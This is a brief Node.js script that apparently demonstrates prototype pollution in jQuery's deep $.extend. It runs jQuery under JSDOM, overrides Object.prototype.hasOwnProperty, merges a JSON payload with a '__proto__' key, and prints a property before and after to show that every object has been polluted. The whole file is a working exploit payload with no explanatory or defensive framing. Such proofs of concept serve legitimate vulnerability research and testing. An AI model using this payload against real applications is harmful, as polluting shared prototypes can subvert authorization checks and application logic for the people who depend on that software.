Object.prototype.hasOwnProperty = () => true;
const {JSDOM} = require('jsdom');
const {window} = new JSDOM('');
const $ = require('jquery')(window);
obj = {};
console.log({}.polluted);
$.extend(true, {}, JSON.parse('{"__proto__": {"polluted": "yes"}}'));
console.log({}.polluted);